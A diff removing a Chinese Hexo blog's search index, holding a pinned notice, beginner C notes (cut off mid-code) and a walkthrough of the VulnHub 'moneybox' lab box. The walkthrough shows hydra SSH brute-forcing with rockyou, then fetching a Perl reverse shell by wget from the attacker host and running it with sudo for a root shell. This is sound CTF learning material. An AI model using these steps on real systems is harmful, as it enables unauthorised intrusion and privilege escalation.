@@ -1,257 +1,172 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>要置顶的公告</title>
-    <url>/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="新朋友初次见面-老朋友好久不见-这里是猫涅"><a href="#新朋友初次见面-老朋友好久不见-这里是猫涅" class="headerlink" title="新朋友初次见面 老朋友好久不见 这里是猫涅"></a>新朋友初次见面 老朋友好久不见 这里是猫涅</h1><p>2023/9/5 更新：<br>超绝帅气的介绍页进入页面已经<s>借助chatgpt的伟力</s>完成了<br>后期完善会在那里加点分支<br>还有就是随笔啥的多半会加到里面 博客主题仅分享学术内容好了<br>2023/10/22 更新:<br>c语言这块还差一点收尾的环节<br>介绍一下新环节 靶机分析<br>课上讲过的再通过图文还原一下<br>2023/10/26 更新:<br>icon全面更换为了自制手绘icon 耶<br><img data-src="/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/medium.png" alt="icon"></p>
-<p><a href="https://markdown.com.cn/cheat-sheet.html">关于markdown的写作相关</a> </p>
-<p>ps:<br>hexo装到奇怪的地方了 所以git bash的时候命令前记得加npx<br>还有就是git bash中的复制粘贴分别是<br><strong>复制: ctrl + insert</strong><br><strong>粘贴: shift + insert</strong></p>
-<p>无渲染跳转方式: 在文章前加入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">---</span><br><span class="line">layout: false </span><br><span class="line">--- </span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
-      <tags>
-        <tag>告示</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>moneybox解析</title>
-    <url>/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p><em><strong>注1:由于我没有解决加载问题 因此没有魔法网络的用户很有可能无法顺利看到图片 烦请根据文字自己判断一下步骤结果 谢谢</strong></em><br><em><strong>注2:该教程使用的环境是我的个人pc 实战操作可能由于系统原因 vmware配置 虚拟机版本等出现细微的不同 希望各位随机应变勇闯难关</strong></em></p>
-<h1 id="1-关于事先配置"><a href="#1-关于事先配置" class="headerlink" title="1.关于事先配置"></a>1.关于事先配置</h1><p>安装了<strong>vmware</strong>的pc一台<br>kali <a href="https://www.kali.org/get-kali/#kali-virtual-machines">下载页面</a><br>还有我们的主角 moneybox <a href="https://www.vulnhub.com/entry/moneybox-1,653/#download">下载页面</a><br>在<strong>vmware</strong>中打开虚拟机 选择kali和moneybox并安装</p>
-<p>为了方便后续的步骤<strong>记得在虚拟机设置-网络适配器中将两个虚拟机都设置为NAT模式</strong><br>这样你就完成了基础的配置</p>
-<h1 id="2-具体步骤"><a href="#2-具体步骤" class="headerlink" title="2.具体步骤"></a>2.具体步骤</h1><span id="more"></span>
-<h2 id="（1）moneybox的启动"><a href="#（1）moneybox的启动" class="headerlink" title="（1）moneybox的启动"></a>（1）moneybox的启动</h2><p>在启动时立马按e编辑启动项</p>
-<p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step1.jpg" alt="step1.jpg"></p>
-<p>↑在启动项中 linux 开头这行将 <strong>ro</strong> 改成 <strong>rw single init=bin/bash</strong><br>随后按 <strong>ctrl+x</strong> 保存<br>可以通过进入单用户模式的方式修改密码<br>输入<strong>passwd root</strong> 将密码更改成任意你所希望的样子<br>这之后重启 输入账号<strong>root</strong> 与 <strong>你更改的密码</strong><br>进入后输入 <strong>dhclient</strong> 配置网络接口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step2.jpg" alt="step2.jpg"><br>↑示例<br>随后一直挂着moneybox就可以了 转到kali这边</p>
-<h2 id="（2）kali部分的操作"><a href="#（2）kali部分的操作" class="headerlink" title="（2）kali部分的操作"></a>（2）kali部分的操作</h2><h3 id="（2-1）找到靶机所处的网段"><a href="#（2-1）找到靶机所处的网段" class="headerlink" title="（2.1）找到靶机所处的网段"></a>（2.1）找到靶机所处的网段</h3><p>kali打开 默认账号密码是kali/kali<br>先 <strong>sudo arp-scan -l</strong> 扫描一下同网段设备<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step3.jpg" alt="step3.jpg"><br>不太确定哪个是靶机 是吧<br>先用<strong>nmap -p- 192.168.246.0/24</strong>扫描一下这些ip开放的端口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step4.jpg" alt="step4.jpg"><br>结果说<strong>192.168.246.129</strong>开放了仨端口 分别是<strong>21 22 80</strong><br>可以确定是靶机了<br>接下来就会围绕这个ip展开操作</p>
-<h3 id="（2-2）三个端口所引导的线索"><a href="#（2-2）三个端口所引导的线索" class="headerlink" title="（2.2）三个端口所引导的线索"></a>（2.2）三个端口所引导的线索</h3><p>首先是 <strong>21端口</strong> 对应的 <strong>ftp功能</strong><br>使用ftp+ip的方式尝试远程登陆<br>发现需要密码 回车后显示<strong>530 This FTP server is anonymous only.</strong><br>既然仅限匿名登录 那就<strong>以anonymous为账号 密码为空</strong>来登陆<br>登录完毕 ls查看目录下文件<br>有一张名为trytofind.jpg的图片 用get+文件名的方式获取<br>随后用exit退出ftp<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step5.jpg" alt="step5.jpg"><br><strong>steghide+info+图片文件名</strong>寻找是否有图片隐写 发现需要密码 线索暂时断了<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step7.jpg" alt="step7.jpg"></p>
-<p> <em><strong>ps:关于显示steghide未安装 随后无法安装显示E:Unable to locate package的解决方式</strong></em></p>
-<blockquote>
-<p>第一步：打开sources.list文件</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></tbody></table></figure>
-<blockquote>
-<p>第二步：在文件中添加以下内容</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">deb http://http.kali.org/kali kali-rolling main contrib non-free</span><br><span class="line">deb http://http.kali.org/kali sana main non-free contrib</span><br><span class="line">deb http://security.kali.org/kali-security sana/updates main contrib non-free</span><br><span class="line">deb http://old.kali.org/kali moto main non-free contrib</span><br></pre></td></tr></tbody></table></figure>
-<blockquote>
-<p>然后保存退出，再进行更新</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></tbody></table></figure>
-<blockquote>
-<p>————————————————<br>版权声明：上面这段说明为CSDN博主「聂大哥」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_43729943/article/details/104221462">https://blog.csdn.net/weixin_43729943/article/details/104221462</a></p>
-</blockquote>
-<p><strong>22端口所对应的ssh功能</strong>通常需要账号密码 目前没有线索 我们先转到http上去寻找<br>打开firefox 我们输入ip地址<strong>192.168.246.129</strong><br>进入主页<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step8.jpg" alt="step8.jpg"><br>我们<strong>f12</strong>查看一下源码<br>发现啥也没藏<br>于是使用我们的工具<br><strong>dirb+网址</strong>来寻找是否有潜在的目录<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step9.jpg" alt="step9.jpg"><br>↑运行结果发现了名为<a href="http://192.168.246.129/blogs/index.html%E7%9A%84%E7%9B%AE%E5%BD%95">http://192.168.246.129/blogs/index.html的目录</a><br>进入网址<br>还是老样子<strong>f12</strong>查看源码 发现注释里藏了点东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step10.jpg" alt="step10.jpg"><br>它说是提示在这个目录里 那就进入<a href="http://192.168.246.129/S3cr3t-T3xt/">http://192.168.246.129/S3cr3t-T3xt/</a><br>还是在源码里藏了东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step11.jpg" alt="step11.jpg"><br>发现了一段Secret Key 保存下来备用<br>我们猜测这段密文和steghide中的密码相对应 尝试输入<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step12.jpg" alt="step12.jpg"><br>提取出了<strong>data.txt</strong><br>其中内容为暗示一个<strong>名为renu的用户</strong>的密码强度很弱<br>或许可以使用密码爆破来获得密码<br>于是我们可以利用<strong>kali自带的密码爆破字典</strong>与<strong>hydra</strong>来爆破<br>rockyou.txt被压缩，需要解压才能够使用</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">gzip -d /usr/share/wordlists/rockyou.txt.gz		#-d 将压缩文件解压</span><br><span class="line">ll /usr/share/wordlists/rockyou.txt		#显示当前目录下文件详细信息</span><br></pre></td></tr></tbody></table></figure>
-<p><em><strong>hydra使用方法:</strong></em></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 协议://ip地址</span><br></pre></td></tr></tbody></table></figure>
-<p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step13.jpg" alt="step13.jpg"><br>↑试出来的结果是密码为987654321</p>
-<h3 id="2-3-ssh连接与操作"><a href="#2-3-ssh连接与操作" class="headerlink" title="(2.3)ssh连接与操作"></a>(2.3)ssh连接与操作</h3><p>使用<strong>ssh+账号@ip:端口</strong>来链接renu<br>输入密码 链接成功<br>输入ls来查看文件 有一个txt<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step14.jpg" alt="step14.jpg"><br>↑cat user1.txt获得第一个flag<br>第二个flag在于这个电脑所留下的操作历史<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step15.jpg" alt="step15.jpg"><br>里面有免密登陆一个叫lily的用户的过程<br>说明此用户已经将自己的公钥拷贝到了靶机系统上的lily用户家目录的authorized_keys文件，从而可以不用密码就以lily身份登录到靶机上。<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step16.jpg" alt="step16.jpg"><br>第二个flag也获得了<br>第三个flag多半是在root账号中<br>但sudo的权限也无法查看<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step17.jpg" alt="step17.jpg"><br>这里就要用到一些高级操作<br>我这里直接引用课上的讲义了</p>
-<blockquote>
-<p>执行sudo -l发现该用户存在sudo赋权，程序为/usr/bin/perl，perl同python类似，也是一门解释型语言，推测靶机应该有perl运行环境。下面是如何通过Perl程序提权的实现过程。<br>思路：kali中自带perl脚本反弹shell，将其略加修改拷贝到靶机上；该脚本需要在渗透机监听一个端口(默认为1234)，然后在靶机上运行perl脚本，靶机会自动反弹一个shell到渗透机，从而通过运行perl程序获得一个管理员的Shell。</p>
-</blockquote>
-<ol>
-<li>定位kali中的perl脚本反弹shell，将其拷贝到kali的/var/www/html下，重命名为p.php；<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cd /usr/share/webshells/perl</span><br><span class="line">sudo cp perl-reverse-shell.pl /var/www/html/p.php</span><br><span class="line">cd /var/www/html</span><br><span class="line">ls</span><br></pre></td></tr></tbody></table></figure>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step18.jpg" alt="step18.jpg"></li>
-<li>修改p.php文件内容，将反弹连接的Ip地址改为kali的IP；<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo vim p.php //把my $ip这段单引号里面的ip改成kali的</span><br></pre></td></tr></tbody></table></figure>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step19.jpg" alt="step19.jpg"></li>
-<li>开启kali的网站服务<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">systemctl start apache2</span><br></pre></td></tr></tbody></table></figure>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step20.jpg" alt="step20.jpg"></li>
-<li>切换到靶机lily会话，通过http协议下载p.php<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget http://ip/p.php //不知道ip的可以在另个窗口ifconfig查看</span><br></pre></td></tr></tbody></table></figure>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step21.jpg" alt="step21.jpg"></li>
-<li>kali 通过nc命令监听1234端口<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nc -lnvp 1234</span><br></pre></td></tr></tbody></table></figure>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step22.jpg" alt="step22.jpg"></li>
-<li>靶机上通过sudo 运行p.php程序<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo /usr/bin/perl p.php</span><br></pre></td></tr></tbody></table></figure>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step23.jpg" alt="step23.jpg"></li>
-<li>切换到渗透机kali，成功反弹管理员权限shell<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">id</span><br><span class="line">cd /root</span><br><span class="line">ls -a</span><br><span class="line">cat .root.txt</span><br></pre></td></tr></tbody></table></figure>
-<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step24.jpg" alt="step24.jpg"></li>
-<li>拿到最终flag啦！<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Congratulations.......!</span><br><span class="line"></span><br><span class="line">You Successfully completed MoneyBox</span><br><span class="line"></span><br><span class="line">Finally The Root Flag</span><br><span class="line">    ==&gt; r00t{H4ckth3p14n3t}</span><br><span class="line"></span><br><span class="line">I'm Kirthik-KarvendhanT</span><br><span class="line">    It's My First CTF Box</span><br><span class="line">         </span><br><span class="line">instagram : ____kirthik____</span><br><span class="line"></span><br><span class="line">See You Back....</span><br></pre></td></tr></tbody></table></figure></li>
-</ol>
-<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>前两个flag较为简易 最后一个flag要花点力气<br>希望今后的学习能让我更透彻的理解渗透测试的奥妙<br>那么 下次再见！</p>
-</body></html>]]></content>
-      <tags>
-        <tag>学习</tag>
-        <tag>靶机解析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>C语言 启动！</title>
-    <url>/2023/08/01/C%E8%AF%AD%E8%A8%80%20%E5%90%AF%E5%8A%A8%EF%BC%81/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>所以 最近很闲 所以开始学c语言</p>
-<span id="more"></span>
-<h1 id="准备步骤"><a href="#准备步骤" class="headerlink" title="准备步骤"></a>准备步骤</h1><p>我使用了visual studio code配置c语言环境的方法来实现程序的调试和运行<br><a href="https://www.bilibili.com/video/BV19c411G7ey">我所参考的教程</a></p>
-<h1 id="学习笔记啥的"><a href="#学习笔记啥的" class="headerlink" title="学习笔记啥的"></a>学习笔记啥的</h1><h2 id="一-经典到不能再经典的hello-world"><a href="#一-经典到不能再经典的hello-world" class="headerlink" title="一.经典到不能再经典的hello world"></a>一.经典到不能再经典的hello world</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">    /* 我的第一个 C 程序 */</span><br><span class="line">    printf("Hello, World! \n");</span><br><span class="line"> </span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<p><strong>实例解析：</strong></p>
-<ul>
-<li>所有的 C 语言程序都需要包含&nbsp;<strong>main()</strong>&nbsp;函数。 代码从&nbsp;<strong>main()</strong>&nbsp;函数开始执行。</li>
-<li><strong>/* … */</strong>&nbsp;用于注释说明。</li>
-<li><strong>printf()</strong>&nbsp;用于格式化输出到屏幕。<strong>printf()</strong>&nbsp;函数在&nbsp;<strong>“stdio.h”</strong>&nbsp;头文件中声明。</li>
-<li><strong>stdio.h</strong>&nbsp;是一个头文件 (标准输入输出头文件) ,&nbsp;<strong>#include</strong>&nbsp;是一个预处理命令，用来引入头文件。 当编译器遇到&nbsp;<strong>printf()</strong>&nbsp;函数时，如果没有找到&nbsp;<strong>stdio.h</strong>&nbsp;头文件，会发生编译错误。</li>
-<li><strong>return 0;</strong>&nbsp;语句用于表示退出程序。</li>
-</ul>
-<h2 id="二-关于定义变量和变量的类型"><a href="#二-关于定义变量和变量的类型" class="headerlink" title="二.关于定义变量和变量的类型"></a>二.关于定义变量和变量的类型</h2><h3 id="（1）单纯的计算"><a href="#（1）单纯的计算" class="headerlink" title="（1）单纯的计算"></a>（1）单纯的计算</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; //这个是类似于import的东西 没有它printf会失效</span><br><span class="line">int x;// 这里是我定义了x</span><br><span class="line">int y;// 这里是我定义了y</span><br><span class="line">int wow()// 定义一个叫wow（）的进程</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; extern int x;// 借用外部定义好的x</span><br><span class="line">&nbsp; &nbsp; extern int y;// 借用外部定义好的y</span><br><span class="line">&nbsp; &nbsp; x = 1222;</span><br><span class="line">&nbsp; &nbsp; y = 1999;// 为x y赋值</span><br><span class="line">&nbsp; &nbsp; return x*y;// 程序的结果是输出x乘以y的数字</span><br><span class="line">}</span><br><span class="line">int main()// 主程序 不能缺少</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; int jieguo;</span><br><span class="line">&nbsp; &nbsp; jieguo = wow(); //用jieguo这个定义好的变量来表示wow（）的结果</span><br><span class="line">&nbsp; &nbsp; printf("你得到的结果是：%d",jieguo);//将输出的东西表示出来</span><br><span class="line">&nbsp; &nbsp; return 0;//结束程序</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<p>输出结果：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">你得到的结果是：2442778</span><br></pre></td></tr></tbody></table></figure>
-<p>题外话：<br>printf（）中的%d指输出整数，实际显示的时候会被逗号后的结果所代替。</p>
-<h3 id="（2）利用scanf-加入互动环节"><a href="#（2）利用scanf-加入互动环节" class="headerlink" title="（2）利用scanf()加入互动环节"></a>（2）利用scanf()加入互动环节</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; //这个是类似于import的东西 没有它printf会失效</span><br><span class="line">int x=0;// 这里是我定义了x</span><br><span class="line">int y=0;// 这里是我定义了y</span><br><span class="line">int wow()// 定义一个叫wow（）的进程</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; extern int x;// 借用外部定义好的x</span><br><span class="line">&nbsp; &nbsp; extern int y;// 借用外部定义好的y</span><br><span class="line">&nbsp; &nbsp; printf("请输入x值\n");</span><br><span class="line">&nbsp; &nbsp; scanf("%d",&amp;x);</span><br><span class="line">&nbsp; &nbsp; printf("请输入y值\n");</span><br><span class="line">&nbsp; &nbsp; scanf("%d",&amp;y);</span><br><span class="line">&nbsp; &nbsp; return x*y;// 程序的结果是输出x乘以y的数字</span><br><span class="line">}</span><br><span class="line">int main()// 主程序 不能缺少</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; int jieguo;</span><br><span class="line">&nbsp; &nbsp; jieguo = wow(); //用jieguo这个定义好的变量来表示wow（）的结果</span><br><span class="line">&nbsp; &nbsp; printf("你得到的结果是：%d",jieguo);//将输出的东西表示出来</span><br><span class="line">&nbsp; &nbsp; return 0;//结束程序</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<p>输出：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">请输入x值</span><br><span class="line">9</span><br><span class="line">请输入y值</span><br><span class="line">11</span><br><span class="line">你得到的结果是：99</span><br></pre></td></tr></tbody></table></figure>
-<p>题外话：<br>scanf()中输入的东西是他所需要获取的 如加入逗号或者空格后不按照格式输入<br>理论来说会无法读取<br>\n代表换行<br>scanf(“%d, %d, %d”,&amp;a,&amp;b,&amp;c);  ←复合用法</p>
-<h2 id="三-循环与if-else"><a href="#三-循环与if-else" class="headerlink" title="三.循环与if else"></a>三.循环与if else</h2><h3 id="（1）while"><a href="#（1）while" class="headerlink" title="（1）while"></a>（1）while</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; int i=0;</span><br><span class="line">&nbsp; &nbsp; while (i&lt;=100)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; i++;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("第%d",i);</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("次\n");</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<p>结果：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">第1次</span><br><span class="line">第2次</span><br><span class="line">第3次</span><br><span class="line">第4次</span><br><span class="line">第5次</span><br><span class="line">第6次</span><br><span class="line">第7次</span><br><span class="line">第8次</span><br><span class="line">第9次</span><br><span class="line">(中略)</span><br><span class="line">第101次</span><br></pre></td></tr></tbody></table></figure>
-<p>说真的 c语言和python蛮像哈？<br>下表显示了 C 语言支持的所有算术运算符。假设变量&nbsp;<strong>A</strong>&nbsp;的值为 10，变量&nbsp;<strong>B</strong>&nbsp;的值为 20，则：</p>
-<table>
-<thead>
-<tr>
-<th>运算符</th>
-<th>描述</th>
-<th>实例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>+</td>
-<td>把两个操作数相加</td>
-<td>A + B 将得到 30</td>
-</tr>
-<tr>
-<td>-</td>
-<td>从第一个操作数中减去第二个操作数</td>
-<td>A - B 将得到 -10</td>
-</tr>
-<tr>
-<td>*</td>
-<td>把两个操作数相乘</td>
-<td>A * B 将得到 200</td>
-</tr>
-<tr>
-<td>/</td>
-<td>分子除以分母</td>
-<td>B / A 将得到 2</td>
-</tr>
-<tr>
-<td>%</td>
-<td>取模运算符，整除后的余数</td>
-<td>B % A 将得到 0</td>
-</tr>
-<tr>
-<td>++</td>
-<td>自增运算符，整数值增加 1</td>
-<td>A++ 将得到 11</td>
-</tr>
-<tr>
-<td>–</td>
-<td>自减运算符，整数值减少 1</td>
-<td>A– 将得到 9</td>
-</tr>
-</tbody></table>
-<h3 id="（2）if-else与switch-case"><a href="#（2）if-else与switch-case" class="headerlink" title="（2）if else与switch-case"></a>（2）if else与switch-case</h3><p>以下两种代码实现的是一种功能</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(){</span><br><span class="line">&nbsp; &nbsp; int type=0;</span><br><span class="line">&nbsp; &nbsp; printf("请输入1-5以内的数字来获取回应\n");</span><br><span class="line">&nbsp; &nbsp; scanf("%d",&amp;type);</span><br><span class="line">&nbsp; &nbsp; if ( type==1 )</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("1");</span><br><span class="line">&nbsp; &nbsp; else if ( type==2 )</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("2");</span><br><span class="line">&nbsp; &nbsp; else if ( type==3 )</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("3");</span><br><span class="line">&nbsp; &nbsp; else if ( type==4 )</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("4");</span><br><span class="line">&nbsp; &nbsp; else if ( type==5 )</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("5");</span><br><span class="line">&nbsp; &nbsp; else</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("格式错误");</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(){</span><br><span class="line">&nbsp; &nbsp; int type=0;</span><br><span class="line">&nbsp; &nbsp; printf("请输入1-5以内的数字来获取回应\n");</span><br><span class="line">&nbsp; &nbsp; scanf("%d",&amp;type);</span><br><span class="line">&nbsp; &nbsp; switch (type) {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; case 1:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; print("1");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; break;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; case 2:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("2");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; break;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; case 3:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("3");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; break;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; case 4:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("4");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; break;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; case 5:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("5");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; break;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; default:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("格式错误");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; break;</span><br><span class="line">&nbsp; &nbsp; }</span><br></pre></td></tr></tbody></table></figure>
-<p>结论都是一样的</p>
-<h2 id="四、while和do-while"><a href="#四、while和do-while" class="headerlink" title="四、while和do while"></a>四、while和do while</h2><h3 id="（1）while-1"><a href="#（1）while-1" class="headerlink" title="（1）while"></a>（1）while</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(){</span><br><span class="line">&nbsp; &nbsp; int o=0;</span><br><span class="line">&nbsp; &nbsp; while ( o&lt;10)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; o++;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("%d",o);</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<p>简称来说就是当条件成立时 一直重复运行某物</p>
-<p>输出：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td></tr></tbody></table></figure>
-
-<h3 id="2-do-while"><a href="#2-do-while" class="headerlink" title="(2) do while"></a>(2) do while</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(){</span><br><span class="line">&nbsp; &nbsp; int i=0;</span><br><span class="line">&nbsp; &nbsp; do</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; i++;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("%d",i);</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");</span><br><span class="line">&nbsp; &nbsp; } while ( i != 10);</span><br><span class="line">&nbsp; &nbsp; return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<p>while的换了个顺序版本<br>结果都是一样的就不放出来了</p>
-<h2 id="五、整合一下先"><a href="#五、整合一下先" class="headerlink" title="五、整合一下先"></a>五、整合一下先</h2><h3 id="（1）比大小"><a href="#（1）比大小" class="headerlink" title="（1）比大小"></a>（1）比大小</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(){</span><br><span class="line">&nbsp; &nbsp; int a,b,c,max;</span><br><span class="line">&nbsp; &nbsp; printf("请输入三个数字 以逗号隔开\n");</span><br><span class="line">&nbsp; &nbsp; scanf("%d,%d,%d",&amp;a,&amp;b,&amp;c);</span><br><span class="line">&nbsp; &nbsp; if(a&gt;b){ &nbsp;</span><br><span class="line">	&nbsp; &nbsp; max = a;</span><br><span class="line">&nbsp; &nbsp; }else{</span><br><span class="line">	&nbsp; &nbsp; max = b;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; if(c&gt;max){</span><br><span class="line">	&nbsp; &nbsp; max = c;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; printf("max=%d", max);</span><br><span class="line">&nbsp; &nbsp; return 